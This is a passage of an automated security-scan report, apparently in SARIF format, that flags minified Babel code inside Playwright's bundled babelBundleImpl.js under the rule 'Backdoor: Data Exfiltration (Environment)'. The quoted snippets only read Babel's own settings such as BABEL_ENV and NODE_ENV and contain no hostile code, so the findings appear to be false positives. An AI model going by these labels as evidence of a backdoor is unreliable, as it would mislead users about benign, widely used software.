                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 6926,
                  "endLine": 7,
                  "endColumn": 6937,
                  "snippet": {
                    "text": "ressionStatement\",{visitor:[\"expression\"],fields:{expression:{validate:(0,h.assertNodeType)(\"Expression\")}},aliases:[\"Statement\",\"ExpressionWrapper\"]});Q(\"File\",{builder:[\"program\",\"comments\",\"tokens\"],visitor:[\"program\"],fields:{program:{validate:(0,h.assertNodeType)(\"Program\")},comments:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertEach)((0,h.assertNodeType)(\"CommentBlock\",\"CommentLine\")):Object.assign(()=>{},{each:{oneOfNodeTypes:[\"CommentBlock\",\"CommentLine\"]}}),optional:!0},tokens:{validate:(0,h.assertEach)(Object.assign(()=>{},{type:\"any\"})),optional:!0}}});Q(\"ForInStatement\",{visitor:[\"l",
                    "rendered": {
                      "text": "ressionStatement\",{visitor:[\"expression\"],fields:{expression:{validate:(0,h.assertNodeType)(\"Expression\")}},aliases:[\"Statement\",\"ExpressionWrapper\"]});Q(\"File\",{builder:[\"program\",\"comments\",\"tokens\"],visitor:[\"program\"],fields:{program:{validate:(0,h.assertNodeType)(\"Program\")},comments:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertEach)((0,h.assertNodeType)(\"CommentBlock\",\"CommentLine\")):Object.assign(()=>{},{each:{oneOfNodeTypes:[\"CommentBlock\",\"CommentLine\"]}}),optional:!0},tokens:{validate:(0,h.assertEach)(Object.assign(()=>{},{type:\"any\"})),optional:!0}}});Q(\"ForInStatement\",{visitor:[\"l",
                      "markdown": "`ressionStatement\",{visitor:[\"expression\"],fields:{expression:{validate:(0,h.assertNodeType)(\"Expression\")}},aliases:[\"Statement\",\"ExpressionWrapper\"]});Q(\"File\",{builder:[\"program\",\"comments\",\"tokens\"],visitor:[\"program\"],fields:{program:{validate:(0,h.assertNodeType)(\"Program\")},comments:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertEach)((0,h.assertNodeType)(\"CommentBlock\",\"CommentLine\")):Object.assign(()=>{},{each:{oneOfNodeTypes:[\"CommentBlock\",\"CommentLine\"]}}),optional:!0},tokens:{validate:(0,h.assertEach)(Object.assign(()=>{},{type:\"any\"})),optional:!0}}});Q(\"ForInStatement\",{visitor:[\"l`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 5332,
                  "endLine": 7,
                  "endColumn": 5343,
                  "snippet": {
                    "text": ":[\"Expression\"],fields:Object.assign({callee:{validate:(0,h.assertNodeType)(\"Expression\",\"Super\",\"V8IntrinsicIdentifier\")},arguments:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Expression\",\"SpreadElement\",\"JSXNamespacedName\",\"ArgumentPlaceholder\")))}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:(0,h.assertOneOf)(!0,!1),optional:!0}},{typeArguments:{validate:(0,h.assertNodeType)(\"TypeParameterInstantiation\"),optional:!0},typeParameters:{validate:(0,h.assertNodeType)(\"TSTypeParameterInstantiation\"),optional:!0}})});Q(\"CatchClause\",{visitor:[\"par",
                    "rendered": {
                      "text": ":[\"Expression\"],fields:Object.assign({callee:{validate:(0,h.assertNodeType)(\"Expression\",\"Super\",\"V8IntrinsicIdentifier\")},arguments:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Expression\",\"SpreadElement\",\"JSXNamespacedName\",\"ArgumentPlaceholder\")))}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:(0,h.assertOneOf)(!0,!1),optional:!0}},{typeArguments:{validate:(0,h.assertNodeType)(\"TypeParameterInstantiation\"),optional:!0},typeParameters:{validate:(0,h.assertNodeType)(\"TSTypeParameterInstantiation\"),optional:!0}})});Q(\"CatchClause\",{visitor:[\"par",
                      "markdown": "`:[\"Expression\"],fields:Object.assign({callee:{validate:(0,h.assertNodeType)(\"Expression\",\"Super\",\"V8IntrinsicIdentifier\")},arguments:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Expression\",\"SpreadElement\",\"JSXNamespacedName\",\"ArgumentPlaceholder\")))}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:(0,h.assertOneOf)(!0,!1),optional:!0}},{typeArguments:{validate:(0,h.assertNodeType)(\"TypeParameterInstantiation\"),optional:!0},typeParameters:{validate:(0,h.assertNodeType)(\"TSTypeParameterInstantiation\"),optional:!0}})});Q(\"CatchClause\",{visitor:[\"par`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 3141,
                  "endLine": 7,
                  "endColumn": 3152,
                  "snippet": {
                    "text": "gnmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");return function(r,n,s){((0,ur.default)(\"Pattern\",r.left)?t:e)(r,n,s)}}()},left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\",\"OptionalMemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\",\"OptionalMemberExpression\")},right:{validate:(0,h.asser",
                    "rendered": {
                      "text": "gnmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");return function(r,n,s){((0,ur.default)(\"Pattern\",r.left)?t:e)(r,n,s)}}()},left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\",\"OptionalMemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\",\"OptionalMemberExpression\")},right:{validate:(0,h.asser",
                      "markdown": "`gnmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");return function(r,n,s){((0,ur.default)(\"Pattern\",r.left)?t:e)(r,n,s)}}()},left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\",\"OptionalMemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"LVal\",\"OptionalMemberExpression\")},right:{validate:(0,h.asser`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 2902,
                  "endLine": 7,
                  "endColumn": 2913,
                  "snippet": {
                    "text": "ate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeOrValueType)(\"null\",\"Expression\",\"SpreadElement\"))),default:process.env.BABEL_TYPES_8_BREAKING?void 0:[]}},visitor:[\"elements\"],aliases:[\"Expression\"]});Q(\"AssignmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");return function(r,n,s){((0,ur.default)(\"Pattern\",r.left)?t:e)(r,n,s)}}()},left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"Me",
                    "rendered": {
                      "text": "ate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeOrValueType)(\"null\",\"Expression\",\"SpreadElement\"))),default:process.env.BABEL_TYPES_8_BREAKING?void 0:[]}},visitor:[\"elements\"],aliases:[\"Expression\"]});Q(\"AssignmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");return function(r,n,s){((0,ur.default)(\"Pattern\",r.left)?t:e)(r,n,s)}}()},left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"Me",
                      "markdown": "`ate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeOrValueType)(\"null\",\"Expression\",\"SpreadElement\"))),default:process.env.BABEL_TYPES_8_BREAKING?void 0:[]}},visitor:[\"elements\"],aliases:[\"Expression\"]});Q(\"AssignmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");return function(r,n,s){((0,ur.default)(\"Pattern\",r.left)?t:e)(r,n,s)}}()},left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"Identifier\",\"Me`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 2741,
                  "endLine": 7,
                  "endColumn": 2752,
                  "snippet": {
                    "text": "lareMethodCommon=void 0;var ur=Ii(),m4=_i(),hv=Oi(),y4=av(),Ha=is(),h=wn(),Q=(0,h.defineAliasedType)(\"Standardized\");Q(\"ArrayExpression\",{fields:{elements:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeOrValueType)(\"null\",\"Expression\",\"SpreadElement\"))),default:process.env.BABEL_TYPES_8_BREAKING?void 0:[]}},visitor:[\"elements\"],aliases:[\"Expression\"]});Q(\"AssignmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");",
                    "rendered": {
                      "text": "lareMethodCommon=void 0;var ur=Ii(),m4=_i(),hv=Oi(),y4=av(),Ha=is(),h=wn(),Q=(0,h.defineAliasedType)(\"Standardized\");Q(\"ArrayExpression\",{fields:{elements:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeOrValueType)(\"null\",\"Expression\",\"SpreadElement\"))),default:process.env.BABEL_TYPES_8_BREAKING?void 0:[]}},visitor:[\"elements\"],aliases:[\"Expression\"]});Q(\"AssignmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");",
                      "markdown": "`lareMethodCommon=void 0;var ur=Ii(),m4=_i(),hv=Oi(),y4=av(),Ha=is(),h=wn(),Q=(0,h.defineAliasedType)(\"Standardized\");Q(\"ArrayExpression\",{fields:{elements:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeOrValueType)(\"null\",\"Expression\",\"SpreadElement\"))),default:process.env.BABEL_TYPES_8_BREAKING?void 0:[]}},visitor:[\"elements\"],aliases:[\"Expression\"]});Q(\"AssignmentExpression\",{fields:{operator:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertValueType)(\"string\");let e=(0,h.assertOneOf)(...Ha.ASSIGNMENT_OPERATORS),t=(0,h.assertOneOf)(\"=\");`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 4895,
                  "endLine": 5,
                  "endColumn": 4906,
                  "snippet": {
                    "text": "n{validate:e,optional:!0}}function a4(e){return{validate:ql(e),optional:!0}}function uv(e){return pv(bd(\"array\"),fv(e))}function cv(e){return uv(ql(e))}function o4(e){return gd(cv(e))}function fv(e){function t(r,n,s){if(Array.isArray(s))for(let i=0;i<s.length;i++){let a=`${n}[${i}]`,o=s[i];e(r,a,o),process.env.BABEL_TYPES_8_BREAKING&&(0,Rl.validateChild)(r,a,o)}}return t.each=e,t}function l4(...e){function t(r,n,s){if(e.indexOf(s)<0)throw new TypeError(`Property ${n} expected value to be one of ${JSON.stringify(e)} but got ${JSON.stringify(s)}`)}return t.oneOf=e,t}function md(...e){function t(r,n,s){for(",
                    "rendered": {
                      "text": "n{validate:e,optional:!0}}function a4(e){return{validate:ql(e),optional:!0}}function uv(e){return pv(bd(\"array\"),fv(e))}function cv(e){return uv(ql(e))}function o4(e){return gd(cv(e))}function fv(e){function t(r,n,s){if(Array.isArray(s))for(let i=0;i<s.length;i++){let a=`${n}[${i}]`,o=s[i];e(r,a,o),process.env.BABEL_TYPES_8_BREAKING&&(0,Rl.validateChild)(r,a,o)}}return t.each=e,t}function l4(...e){function t(r,n,s){if(e.indexOf(s)<0)throw new TypeError(`Property ${n} expected value to be one of ${JSON.stringify(e)} but got ${JSON.stringify(s)}`)}return t.oneOf=e,t}function md(...e){function t(r,n,s){for(",
                      "markdown": "`n{validate:e,optional:!0}}function a4(e){return{validate:ql(e),optional:!0}}function uv(e){return pv(bd(\"array\"),fv(e))}function cv(e){return uv(ql(e))}function o4(e){return gd(cv(e))}function fv(e){function t(r,n,s){if(Array.isArray(s))for(let i=0;i<s.length;i++){let a=`${n}[${i}]`,o=s[i];e(r,a,o),process.env.BABEL_TYPES_8_BREAKING&&(0,Rl.validateChild)(r,a,o)}}return t.each=e,t}function l4(...e){function t(r,n,s){if(e.indexOf(s)<0)throw new TypeError(`Property ${n} expected value to be one of ${JSON.stringify(e)} but got ${JSON.stringify(s)}`)}return t.oneOf=e,t}function md(...e){function t(r,n,s){for(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1994,
                  "startColumn": 5746,
                  "endLine": 1994,
                  "endColumn": 5795,
                  "snippet": {
                    "text": "get:function(){return Pn.createConfigItem}});Object.defineProperty(Ke,\"createConfigItemAsync\",{enumerable:!0,get:function(){return Pn.createConfigItemAsync}});Object.defineProperty(Ke,\"createConfigItemSync\",{enumerable:!0,get:function(){return Pn.createConfigItemSync}});Object.defineProperty(Ke,\"getEnv\",{enumerable:!0,get:function(){return _Te.getEnv}});Object.defineProperty(Ke,\"loadOptions\",{enumerable:!0,get:function(){return Pn.loadOptions}});Object.defineProperty(Ke,\"loadOptionsAsync\",{enumerable:!0,get:function(){return Pn.loadOptionsAsync}});Object.defineProperty(Ke,\"loadOptionsSync\",{enumerable:!0,get:function(){return Pn.loadOptionsS",
                    "rendered": {
                      "text": "get:function(){return Pn.createConfigItem}});Object.defineProperty(Ke,\"createConfigItemAsync\",{enumerable:!0,get:function(){return Pn.createConfigItemAsync}});Object.defineProperty(Ke,\"createConfigItemSync\",{enumerable:!0,get:function(){return Pn.createConfigItemSync}});Object.defineProperty(Ke,\"getEnv\",{enumerable:!0,get:function(){return _Te.getEnv}});Object.defineProperty(Ke,\"loadOptions\",{enumerable:!0,get:function(){return Pn.loadOptions}});Object.defineProperty(Ke,\"loadOptionsAsync\",{enumerable:!0,get:function(){return Pn.loadOptionsAsync}});Object.defineProperty(Ke,\"loadOptionsSync\",{enumerable:!0,get:function(){return Pn.loadOptionsS",
                      "markdown": "`get:function(){return Pn.createConfigItem}});Object.defineProperty(Ke,\"createConfigItemAsync\",{enumerable:!0,get:function(){return Pn.createConfigItemAsync}});Object.defineProperty(Ke,\"createConfigItemSync\",{enumerable:!0,get:function(){return Pn.createConfigItemSync}});Object.defineProperty(Ke,\"getEnv\",{enumerable:!0,get:function(){return _Te.getEnv}});Object.defineProperty(Ke,\"loadOptions\",{enumerable:!0,get:function(){return Pn.loadOptions}});Object.defineProperty(Ke,\"loadOptionsAsync\",{enumerable:!0,get:function(){return Pn.loadOptionsAsync}});Object.defineProperty(Ke,\"loadOptionsSync\",{enumerable:!0,get:function(){return Pn.loadOptionsS`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1948,
                  "startColumn": 682,
                  "endLine": 1948,
                  "endColumn": 730,
                  "snippet": {
                    "text": " module '${a}'`),u.code=\"MODULE_NOT_FOUND\",u})(e,{paths:[t]}),i=yield*U_(s,r,n);if(!i)throw new un.default(\"Config file contains no configuration data\",s);return c1(\"Loaded config %o from %o.\",e,t),i}function U_(e,t,r){switch(Nr().extname(e)){case\".js\":case\".cjs\":case\".mjs\":case\".cts\":return Y1e(e,{envName:t,caller:r});default:return z1e(e)}}function*nve(e){let t=process.env.BABEL_SHOW_CONFIG_FOR;if(t!=null){let r=Nr().resolve(e,t);if(!(yield*$1e.stat(r)).isFile())throw new Error(`${r}: BABEL_SHOW_CONFIG_FOR must refer to a regular file, directories are not supported.`);return r}return null}function sve(e){throw new un.default(`Caching was ",
                    "rendered": {
                      "text": " module '${a}'`),u.code=\"MODULE_NOT_FOUND\",u})(e,{paths:[t]}),i=yield*U_(s,r,n);if(!i)throw new un.default(\"Config file contains no configuration data\",s);return c1(\"Loaded config %o from %o.\",e,t),i}function U_(e,t,r){switch(Nr().extname(e)){case\".js\":case\".cjs\":case\".mjs\":case\".cts\":return Y1e(e,{envName:t,caller:r});default:return z1e(e)}}function*nve(e){let t=process.env.BABEL_SHOW_CONFIG_FOR;if(t!=null){let r=Nr().resolve(e,t);if(!(yield*$1e.stat(r)).isFile())throw new Error(`${r}: BABEL_SHOW_CONFIG_FOR must refer to a regular file, directories are not supported.`);return r}return null}function sve(e){throw new un.default(`Caching was ",
                      "markdown": "` module '${a}'`),u.code=\"MODULE_NOT_FOUND\",u})(e,{paths:[t]}),i=yield*U_(s,r,n);if(!i)throw new un.default(\"Config file contains no configuration data\",s);return c1(\"Loaded config %o from %o.\",e,t),i}function U_(e,t,r){switch(Nr().extname(e)){case\".js\":case\".cjs\":case\".mjs\":case\".cts\":return Y1e(e,{envName:t,caller:r});default:return z1e(e)}}function*nve(e){let t=process.env.BABEL_SHOW_CONFIG_FOR;if(t!=null){let r=Nr().resolve(e,t);if(!(yield*$1e.stat(r)).isFile())throw new Error(`${r}: BABEL_SHOW_CONFIG_FOR must refer to a regular file, directories are not supported.`);return r}return null}function sve(e){throw new un.default(`Caching was `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1880,
                  "startColumn": 167,
                  "endLine": 1880,
                  "endColumn": 212,
                  "snippet": {
                    "text": "properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object (when they are enabled).\n\n`+o_(e));n=o;var s=a}if(n!==void 0)for(let[i,a]of a_)Jn(e,i)&&jE(e,i)!==n&&(np(e,i,n),console.warn(`Though the \"loose\" option was set to \"${!n}\" in your @babel/preset-env config, it will not be used for ${a} since the \"loose\" mode option was set to \"${n}\" for ${s}.\nThe \"loose\" option must be the same for @babel/plugin-transform-class-properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object (when they are enabled): you can silence this warning by explicitly a",
                    "rendered": {
                      "text": "properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object (when they are enabled).\n\n`+o_(e));n=o;var s=a}if(n!==void 0)for(let[i,a]of a_)Jn(e,i)&&jE(e,i)!==n&&(np(e,i,n),console.warn(`Though the \"loose\" option was set to \"${!n}\" in your @babel/preset-env config, it will not be used for ${a} since the \"loose\" mode option was set to \"${n}\" for ${s}.\nThe \"loose\" option must be the same for @babel/plugin-transform-class-properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object (when they are enabled): you can silence this warning by explicitly a",
                      "markdown": "`properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object (when they are enabled).\n\n`+o_(e));n=o;var s=a}if(n!==void 0)for(let[i,a]of a_)Jn(e,i)&&jE(e,i)!==n&&(np(e,i,n),console.warn(`Though the \"loose\" option was set to \"${!n}\" in your @babel/preset-env config, it will not be used for ${a} since the \"loose\" mode option was set to \"${n}\" for ${s}.\nThe \"loose\" option must be the same for @babel/plugin-transform-class-properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object (when they are enabled): you can silence this warning by explicitly a`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1748,
                  "startColumn": 403,
                  "endLine": 1748,
                  "endColumn": 423,
                  "snippet": {
                    "text": "}\".`),{code:\"BABEL_ROOT_NOT_FOUND\",dirname:e})}default:throw new Error(\"Assertion failure - unknown rootMode value.\")}}function*II(e){if(e!=null&&(typeof e!=\"object\"||Array.isArray(e)))throw new Error(\"Babel options must be an object, null, or undefined\");let t=e?(0,y0e.validate)(\"arguments\",e):{},{envName:r=(0,m0e.getEnv)(),cwd:n=\".\",root:s=\".\",rootMode:i=\"root\",caller:a,cloneInputAst:o=!0}=t,l=Df().resolve(n),u=v0e(Df().resolve(l,s),i),c=typeof t.filename==\"string\"?Df().resolve(n,t.filename):void 0,f=yield*(0,If.resolveShowConfigPath)(l),p={filename:c,cwd:l,root:u,envName:r,caller:a,showConfig:f===c},m=yield*(0",
                    "rendered": {
                      "text": "}\".`),{code:\"BABEL_ROOT_NOT_FOUND\",dirname:e})}default:throw new Error(\"Assertion failure - unknown rootMode value.\")}}function*II(e){if(e!=null&&(typeof e!=\"object\"||Array.isArray(e)))throw new Error(\"Babel options must be an object, null, or undefined\");let t=e?(0,y0e.validate)(\"arguments\",e):{},{envName:r=(0,m0e.getEnv)(),cwd:n=\".\",root:s=\".\",rootMode:i=\"root\",caller:a,cloneInputAst:o=!0}=t,l=Df().resolve(n),u=v0e(Df().resolve(l,s),i),c=typeof t.filename==\"string\"?Df().resolve(n,t.filename):void 0,f=yield*(0,If.resolveShowConfigPath)(l),p={filename:c,cwd:l,root:u,envName:r,caller:a,showConfig:f===c},m=yield*(0",
                      "markdown": "`}\".`),{code:\"BABEL_ROOT_NOT_FOUND\",dirname:e})}default:throw new Error(\"Assertion failure - unknown rootMode value.\")}}function*II(e){if(e!=null&&(typeof e!=\"object\"||Array.isArray(e)))throw new Error(\"Babel options must be an object, null, or undefined\");let t=e?(0,y0e.validate)(\"arguments\",e):{},{envName:r=(0,m0e.getEnv)(),cwd:n=\".\",root:s=\".\",rootMode:i=\"root\",caller:a,cloneInputAst:o=!0}=t,l=Df().resolve(n),u=v0e(Df().resolve(l,s),i),c=typeof t.filename==\"string\"?Df().resolve(n,t.filename):void 0,f=yield*(0,If.resolveShowConfigPath)(l),p={filename:c,cwd:l,root:u,envName:r,caller:a,showConfig:f===c},m=yield*(0`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1747,
                  "startColumn": 3387,
                  "endLine": 1747,
                  "endColumn": 3399,
                  "snippet": {
                    "text": "plugin\"};return Object.keys(e).forEach(r=>{let n=o0e[r];if(n)n({type:\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0",
                    "rendered": {
                      "text": "plugin\"};return Object.keys(e).forEach(r=>{let n=o0e[r];if(n)n({type:\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0",
                      "markdown": "`plugin\"};return Object.keys(e).forEach(r=>{let n=o0e[r];if(n)n({type:\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
